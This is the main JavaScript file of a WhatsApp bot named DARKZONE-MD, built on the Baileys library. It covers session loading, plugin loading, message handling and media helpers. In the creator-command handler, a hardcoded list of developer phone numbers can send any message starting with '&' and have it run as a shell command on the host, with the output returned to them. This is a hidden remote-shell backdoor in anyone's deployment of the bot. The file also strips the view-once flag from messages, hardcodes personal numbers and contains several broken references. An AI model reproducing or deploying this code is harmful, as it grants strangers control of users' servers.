const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID, 
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs').promises; // Changed to promises API
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;

const ownerNumber = ['923306137477'];
const tempDir = path.join(os.tmpdir(), 'cache-temp');

// Improved temp directory handling
async function setupTempDir() {
  try {
    await fs.mkdir(tempDir, { recursive: true });
  } catch (err) {
    if (err.code !== 'EEXIST') throw err;
  }
}

async function clearTempDir() {
  try {
    const files = await fs.readdir(tempDir);
    await Promise.all(files.map(file => 
      fs.unlink(path.join(tempDir, file)).catch(() => {})
    ));
  } catch (err) {
    console.error('Error clearing temp dir:', err);
  }
}

// Initialize temp directory
setupTempDir().then(() => {
  setInterval(clearTempDir, 5 * 60 * 1000);
});

// Improved session handling
async function setupSession() {
  const sessionPath = path.join(__dirname, 'sessions', 'creds.json');
  
  try {
    await fs.access(sessionPath);
    return true;
  } catch {
    if (!config.SESSION_ID) {
      console.log('Please add your session to SESSION_ID env !!');
      return false;
    }

    try {
      const sessdata = config.SESSION_ID.replace("IK~", '');
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
      
      return new Promise((resolve, reject) => {
        filer.download(async (err, data) => {
          if (err) return reject(err);
          try {
            await fs.mkdir(path.dirname(sessionPath), { recursive: true });
            await fs.writeFile(sessionPath, data);
            console.log("Session downloaded ✅");
            resolve(true);
          } catch (writeErr) {
            reject(writeErr);
          }
        });
      });
    } catch (err) {
      console.error('Session download failed:', err);
      return false;
    }
  }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

async function connectToWA() {
  if (!await setupSession()) {
    console.log('Failed to setup session, retrying in 30 seconds...');
    setTimeout(connectToWA, 30000);
    return;
  }

  console.log("Connecting to WhatsApp ⏳️...");
  
  try {
    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version,
      markOnlineOnConnect: true,
      getMessage: async (key) => {
        return loadMessage(key) || null;
      }
    });

    // Connection event handlers
    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      
      if (connection === 'close') {
        if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
          console.log('Connection closed, reconnecting...');
          setTimeout(connectToWA, 5000);
        }
      } else if (connection === 'open') {
        console.log('🧬 Installing Plugins');
        
        try {
          const pluginDir = path.join(__dirname, "plugins");
          const files = await fs.readdir(pluginDir);
          
          await Promise.all(files.map(async (plugin) => {
            if (path.extname(plugin).toLowerCase() === ".js") {
              try {
                require(path.join(pluginDir, plugin));
              } catch (e) {
                console.error(`Error loading plugin ${plugin}:`, e);
              }
            }
          }));
          
          console.log('Plugins installed successful ✅');
          console.log('Bot connected to whatsapp ✅');
          
          // Send connection notification
          await sendConnectionNotification(conn);
        } catch (err) {
          console.error('Plugin loading error:', err);
        }
      }
    });

    conn.ev.on('creds.update', saveCreds);
    
    // Message processing with better error handling
    conn.ev.on('messages.update', async updates => {
      try {
        for (const update of updates) {
          if (update.update.message === null) {
            console.log("Delete Detected:", JSON.stringify(update, null, 2));
            await AntiDelete(conn, updates).catch(e => 
              console.error('AntiDelete error:', e)
            );
          }
        }
      } catch (err) {
        console.error('Error processing message updates:', err);
      }
    });

    conn.ev.on("group-participants.update", (update) => {
      GroupEvents(conn, update).catch(e =>
        console.error('GroupEvents error:', e)
      );
    });

    // Message processing pipeline
    conn.ev.on('messages.upsert', async ({ messages }) => {
      try {
        await processMessages(conn, messages);
      } catch (err) {
        console.error('Message processing error:', err);
      }
    });

    // Add all utility methods to conn object
    enhanceConnectionObject(conn);

  } catch (err) {
    console.error('Connection error:', err);
    setTimeout(connectToWA, 10000);
  }
}

async function sendConnectionNotification(conn) {
  const greetings = [
    "🤖 DARKZONE-MD BOT",
    "🚀 DARKZONE-MD ONLINE",
    "👾 POWERED BY DARKZONE",
    "💡 INTELLIGENT BOT SYSTEM"
  ];

  const subtitles = [
    "Ultra-Fast | Secure | Smart",
    "Stable | Reliable | Instant",
    "Modern | Lightweight | Intelligent",
    "The Future of WhatsApp Bots"
  ];

  const outro = [
    "Thanks for choosing DARKZONE-MD!",
    "Powered by *𝐸𝑅𝐹𝒜𝒩 𝒜𝐻𝑀𝒜𝒟💻*",
    "Built for your convenience ⚡",
    "Leveling up your automation 🛠"
  ];

  const up = `┏━━━━━━━━━━━━━━━━━━━┓
┃ ${greetings[Math.floor(Math.random() * greetings.length)]}
┃━━━━━━━━━━━━━━━━━━━
┃ 🔰 ${subtitles[Math.floor(Math.random() * subtitles.length)]}
┗━━━━━━━━━━━━━━━━━━━┛

📡 *Status:* _Online & Operational_
🍁 ${outro[Math.floor(Math.random() * outro.length)]}

┏━〔 🧩 *Bot Details* 〕━━
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Mode:* Public
┃ ▸ *Owner:* 𝐸𝑅𝐹𝒜𝒩 𝒜𝐻𝑀𝒜𝒟
┗━━━━━━━━━━━━━━━━━━━
     *channel*: https://whatsapp.com/channel/0029Vb5dDVO59PwTnL86j13J
⭐ *GitHub:* github.com/DARKZONE-MD/DARKZONE-MD.git`;

  try {
    await conn.sendMessage(conn.user.id, { 
      image: { url: `https://files.catbox.moe/r2ncqh` }, 
      caption: up 
    });
  } catch (err) {
    console.error('Failed to send connection notification:', err);
  }
}

async function processMessages(conn, messages) {
  for (const mek of messages) {
    if (!mek.message) continue;

    try {
      // Process message content
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

      if (mek.message.viewOnceMessageV2) {
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
          ? mek.message.ephemeralMessage.message 
          : mek.message;
      }

      // Mark as read if enabled
      if (config.READ_MESSAGE === 'true' && mek.key) {
        await conn.readMessages([mek.key]).catch(() => {});
      }

      // Handle status updates
      if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        await handleStatusUpdate(conn, mek);
      }

      // Save message to storage
      await saveMessage(mek).catch(() => {});

      // Process message commands
      await processMessageContent(conn, mek);

    } catch (err) {
      console.error('Error processing message:', err);
    }
  }
}

async function handleStatusUpdate(conn, mek) {
  if (config.AUTO_STATUS_SEEN === "true") {
    await conn.readMessages([mek.key]).catch(() => {});
  }

  if (config.AUTO_STATUS_REACT === "true") {
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      }
    }, { statusJidList: [mek.key.participant, conn.decodeJid(conn.user.id)] }).catch(() => {});
  }

  if (config.AUTO_STATUS_REPLY === "true" && mek.key.participant) {
    const text = `${config.AUTO_STATUS_MSG}`;
    await conn.sendMessage(
      mek.key.participant, 
      { text: text, react: { text: '💜', key: mek.key } }, 
      { quoted: mek }
    ).catch(() => {});
  }
}

async function processMessageContent(conn, mek) {
  const m = sms(conn, mek);
  const type = getContentType(mek.message);
  const from = mek.key.remoteJid;
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo 
    ? mek.message.extendedTextMessage.contextInfo.quotedMessage 
    : null;
  
  const body = (type === 'conversation') 
    ? mek.message.conversation 
    : (type === 'extendedTextMessage') 
      ? mek.message.extendedTextMessage.text 
      : (type == 'imageMessage') && mek.message.imageMessage.caption 
        ? mek.message.imageMessage.caption 
        : (type == 'videoMessage') && mek.message.videoMessage.caption 
          ? mek.message.videoMessage.caption 
          : '';

  const isCmd = body.startsWith(prefix);
  const budy = typeof mek.text == 'string' ? mek.text : '';
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
  const args = body.trim().split(/ +/).slice(1);
  const text = args.join(' ');
  const isGroup = from.endsWith('@g.us');
  const sender = mek.key.fromMe 
    ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) 
    : (mek.key.participant || mek.key.remoteJid);
  
  const senderNumber = sender.split('@')[0];
  const botNumber = conn.user.id.split(':')[0];
  const pushname = mek.pushName || 'Sin Nombre';
  const isMe = botNumber.includes(senderNumber);
  const isOwner = ownerNumber.includes(senderNumber) || isMe;
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  
  let groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins;
  
  if (isGroup) {
    groupMetadata = await conn.groupMetadata(from).catch(() => ({}));
    groupName = groupMetadata.subject || '';
    participants = groupMetadata.participants || [];
    groupAdmins = await getGroupAdmins(participants).catch(() => []);
    isBotAdmins = groupAdmins.includes(botNumber2);
    isAdmins = groupAdmins.includes(sender);
  }

  const isReact = m.message.reactionMessage ? true : false;
  
  const reply = (teks) => {
    conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(() => {});
  };

  // Handle creator commands
  const udp = botNumber.split('@')[0];
  const erfan = ['923346690239', '923306137477', '923347572367'];
  const ownerFilev2 = await fs.readFile('./lib/sudo.json', 'utf-8').then(JSON.parse).catch(() => []);
  
  let isCreator = [udp, ...erfan, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
    .includes(mek.sender);

  if (isCreator && mek.text.startsWith("&")) {
    let code = budy.slice(2);
    if (!code) {
      reply(`Provide me with a query to run Master!`);
      return;
    }
    
    const { spawn } = require("child_process");
    const resultTest = spawn(code, { shell: true });
    
    resultTest.stdout.on("data", data => reply(data.toString()));
    resultTest.stderr.on("data", data => reply(data.toString()));
    resultTest.on("error", data => reply(data.toString()));
    resultTest.on("close", code => {
      if (code !== 0) reply(`command exited with code ${code}`);
    });
    
    return;
  }

  // Handle auto reactions
  if (!isReact) {
    await handleAutoReactions(conn, mek, m);
  }

  // Check banned users
  const bannedUsers = await fs.readFile('./lib/ban.json', 'utf-8')
    .then(JSON.parse)
    .catch(() => []);
  
  if (bannedUsers.includes(sender)) return;

  // Check mode restrictions
  const ownerFile = await fs.readFile('./lib/sudo.json', 'utf-8')
    .then(JSON.parse)
    .catch(() => []);
  
  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
  const isFileOwner = ownerFile.includes(sender);
  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

  if (!isRealOwner) {
    if (config.MODE === "private") return;
    if (isGroup && config.MODE === "inbox") return;
    if (!isGroup && config.MODE === "groups") return;
  }

  // Process commands
  if (isCmd) {
    await processCommands(conn, mek, {
      from, quoted, body, isCmd, command, args, text, isGroup, 
      sender, senderNumber, botNumber2, botNumber, pushname, 
      isMe, isOwner, isCreator, groupMetadata, groupName, 
      participants, groupAdmins, isBotAdmins, isAdmins, reply
    });
  }
}

async function handleAutoReactions(conn, mek, m) {
  if (config.AUTO_REACT === 'true') {
    const reactions = [
      '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
      '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
      '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
      '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
      '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
      '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
      '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
      '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
      '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
      '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
      '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
      '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
      '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
      '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
      '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
    ];

    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    await m.react(randomReaction).catch(() => {});
  }

  if (config.CUSTOM_REACT === 'true') {
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    await m.react(randomReaction).catch(() => {});
  }
}

async function processCommands(conn, mek, context) {
  const events = require('./command');
  const cmdName = context.body.slice(1).trim().split(" ")[0].toLowerCase();
  
  const cmd = events.commands.find(cmd => 
    cmd.pattern === cmdName || 
    (cmd.alias && cmd.alias.includes(cmdName))
  );
  
  if (cmd) {
    try {
      if (cmd.react) {
        await conn.sendMessage(context.from, { 
          react: { text: cmd.react, key: mek.key }
        }).catch(() => {});
      }
      
      await cmd.function(conn, mek, sms(conn, mek), context);
    } catch (e) {
      console.error("[PLUGIN ERROR]", e);
    }
  }

  // Process other command types
  for (const command of events.commands) {
    try {
      if (context.body && command.on === "body") {
        await command.function(conn, mek, sms(conn, mek), context);
      } else if (mek.q && command.on === "text") {
        await command.function(conn, mek, sms(conn, mek), context);
      } else if (
        (command.on === "image" || command.on === "photo") &&
        mek.type === "imageMessage"
      ) {
        await command.function(conn, mek, sms(conn, mek), context);
      } else if (
        command.on === "sticker" &&
        mek.type === "stickerMessage"
      ) {
        await command.function(conn, mek, sms(conn, mek), context);
      }
    } catch (err) {
      console.error('Command processing error:', err);
    }
  }
}

function enhanceConnectionObject(conn) {
  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user && decode.server && decode.user + '@' + decode.server) ||
        jid
      );
    }
    return jid;
  };

  conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message = message.message?.ephemeralMessage?.message || message.message;
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete message.message?.ignore;
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = {
        ...message.message.viewOnceMessage.message
      };
    }

    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    
    if (mtype != "conversation") context = message.message[mtype].contextInfo;
    
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo
    };

    const waMessage = await generateWAMessageFromContent(jid, content, {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? {
        contextInfo: {
          ...content[ctype].contextInfo,
          ...options.contextInfo
        }
      } : {})
    });

    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  };

  conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    
    let type = await FileType.fromBuffer(buffer);
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
    
    await fs.writeFile(trueFileName, buffer).catch(() => {});
    return trueFileName;
  };

  conn.downloadMediaMessage = async(message) => {
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    
    return buffer;
  };

  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = '';
    let res = await axios.head(url).catch(() => ({}));
    mime = res.headers?.['content-type'] || '';
    
    if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(jid, { 
        video: await getBuffer(url), 
        caption: caption, 
        gifPlayback: true, 
        ...options 
      }, { quoted: quoted, ...options });
    }
    
    let type = mime.split("/")[0] + "Message";
    
    if (mime === "application/pdf") {
      return conn.sendMessage(jid, { 
        document: await getBuffer(url), 
        mimetype: 'application/pdf', 
        caption: caption, 
        ...options 
      }, { quoted: quoted, ...options });
    }
    
    if (mime.split("/")[0] === "image") {
      return conn.sendMessage(jid, { 
        image: await getBuffer(url), 
        caption: caption, 
        ...options 
      }, { quoted: quoted, ...options });
    }
    
    if (mime.split("/")[0] === "video") {
      return conn.sendMessage(jid, { 
        video: await getBuffer(url), 
        caption: caption, 
        mimetype: 'video/mp4', 
        ...options 
      }, { quoted: quoted, ...options });
    }
    
    if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(jid, { 
        audio: await getBuffer(url), 
        caption: caption, 
        mimetype: 'audio/mpeg', 
        ...options 
      }, { quoted: quoted, ...options });
    }
  };

  conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === 'ephemeralMessage';
    
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    
    if (typeof content === 'string') {
      msg[mtype] = text || content;
    } else if (content.caption) {
      content.caption = text || content.caption;
    } else if (content.text) {
      content.text = text || content.text;
    }
    
    if (typeof content !== 'string') {
      msg[mtype] = {
        ...content,
        ...options
      };
    }
    
    if (copy.key.participant) {
      sender = copy.key.participant = sender || copy.key.participant;
    } else if (copy.key.participant) {
      sender = copy.key.participant = sender || copy.key.participant;
    }
    
    if (copy.key.remoteJid.includes('@s.whatsapp.net')) {
      sender = sender || copy.key.remoteJid;
    } else if (copy.key.remoteJid.includes('@broadcast')) {
      sender = sender || copy.key.remoteJid;
    }
    
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === conn.user.id;
    
    return proto.WebMessageInfo.fromObject(copy);
  };

  conn.getFile = async(PATH, save) => {
    let res;
    let data = Buffer.isBuffer(PATH) ? PATH : 
      /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split(',')[1], 'base64') : 
      /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : 
      fs.existsSync(PATH) ? (filename = PATH, await fs.readFile(PATH)) : 
      typeof PATH === 'string' ? PATH : Buffer.alloc(0);
    
    let type = await FileType.fromBuffer(data) || {
      mime: 'application/octet-stream',
      ext: '.bin'
    };
    
    let filename = path.join(__filename, __dirname + new Date() * 1 + '.' + type.ext);
    
    if (data && save) {
      await fs.writeFile(filename, data).catch(() => {});
    }
    
    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data
    };
  };

  conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await conn.getFile(PATH, true);
    let { filename, size, ext, mime, data } = types;
    let type = '';
    let mimetype = mime;
    let pathFile = filename;
    
    if (options.asDocument) type = 'document';
    
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif.js');
      let media = { mimetype: mime, data };
      
      pathFile = await writeExif(media, { 
        packname: Config.packname, 
        author: Config.packname, 
        categories: options.categories ? options.categories : [] 
      });
      
      await fs.unlink(filename).catch(() => {});
      type = 'sticker';
      mimetype = 'image/webp';
    } else if (/image/.test(mime)) {
      type = 'image';
    } else if (/video/.test(mime)) {
      type = 'video';
    } else if (/audio/.test(mime)) {
      type = 'audio';
    } else {
      type = 'document';
    }
    
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options });
    
    return fs.unlink(pathFile).catch(() => {});
  };

  conn.parseMention = async(text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
  };

  conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
    let types = await conn.getFile(path, true);
    let { mime, ext, res, data, filename } = types;
    
    if (res && res.status !== 200 || file.length <= 65536) {
      try { 
        throw { json: JSON.parse(file.toString()) }; 
      } catch (e) { 
        if (e.json) throw e.json;
      }
    }
    
    let type = '';
    let mimetype = mime;
    let pathFile = filename;
    
    if (options.asDocument) type = 'document';
    
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif');
      let media = { mimetype: mime, data };
      
      pathFile = await writeExif(media, { 
        packname: options.packname ? options.packname : Config.packname, 
        author: options.author ? options.author : Config.author, 
        categories: options.categories ? options.categories : [] 
      });
      
      await fs.unlink(filename).catch(() => {});
      type = 'sticker';
      mimetype = 'image/webp';
    } else if (/image/.test(mime)) {
      type = 'image';
    } else if (/video/.test(mime)) {
      type = 'video';
    } else if (/audio/.test(mime)) {
      type = 'audio';
    } else {
      type = 'document';
    }
    
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      caption,
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options });
    
    return fs.unlink(pathFile).catch(() => {});
  };

  conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVid(buff, options);
    } else {
      buffer = await videoToWebp(buff);
    }
    
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };

  conn.sendImageAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImg(buff, options);
    } else {
      buffer = await imageToWebp(buff);
    }
    
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };

  conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
    return conn.sendMessage(jid, { 
      text: text, 
      contextInfo: { 
        mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') 
      }, 
      ...options 
    }, { quoted });
  };

  conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
    let buffer = Buffer.isBuffer(path) ? path : 
      /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split(',')[1], 'base64') : 
      /^https?:\/\//.test(path) ? await (await getBuffer(path)) : 
      fs.existsSync(path) ? await fs.readFile(path) : 
      Buffer.alloc(0);
    
    return await conn.sendMessage(jid, { 
      image: buffer, 
      caption: caption, 
      ...options 
    }, { quoted });
  };

  conn.sendText = (jid, text, quoted = '', options) => {
    return conn.sendMessage(jid, { 
      text: text, 
      ...options 
    }, { quoted });
  };

  conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
    let buttonMessage = {
      text,
      footer,
      buttons,
      headerType: 2,
      ...options
    };
    
    conn.sendMessage(jid, buttonMessage, { quoted, ...options });
  };

  conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
    let message = await prepareWAMessageMedia({ 
      image: img, 
      jpegThumbnail: thumb 
    }, { upload: conn.waUploadToServer });
    
    var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          imageMessage: message.imageMessage,
          "hydratedContentText": text,
          "hydratedFooterText": footer,
          "hydratedButtons": but
        }
      }
    }), options);
    
    conn.relayMessage(jid, template.message, { messageId: template.key.id });
  };

  conn.getName = (jid, withoutContact = false) => {
    let id = conn.decodeJid(jid);
    withoutContact = conn.withoutContact || withoutContact;
    let v;

    if (id.endsWith('@g.us')) {
      return new Promise(async resolve => {
        v = store.contacts[id] || {};
        if (!(v.name.notify || v.subject)) {
          v = conn.groupMetadata(id) || {};
        }
        resolve(
          v.name ||
          v.subject ||
          PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international')
        );
      });
    } else {
      v = id === '0@s.whatsapp.net' ? {
        id,
        name: 'WhatsApp',
      } : id === conn.decodeJid(conn.user.id) ? conn.user : store.contacts[id] || {};
    }

    return (
      (withoutContact ? '' : v.name) ||
      v.subject ||
      v.verifiedName ||
      PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
    );
  };

  conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await conn.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/DARKZONE-md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    
    conn.sendMessage(
      jid,
      {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      },
      { quoted }
    );
  };

  conn.setStatus = status => {
    conn.query({
      tag: 'iq',
      attrs: {
        to: '@s.whatsapp.net',
        type: 'set',
        xmlns: 'status',
      },
      content: [
        {
          tag: 'status',
          attrs: {},
          content: Buffer.from(status, 'utf-8'),
        },
      ],
    });
    return status;
  };

  conn.serializeM = mek => sms(conn, mek, store);
}

app.get("/", (req, res) => {
  res.send("DARKZONE-MD STARTED ✅");
});

app.listen(port, () => 
  console.log(`Server listening on port http://localhost:${port}`)
);

setTimeout(() => {
  connectToWA();
}, 4000);
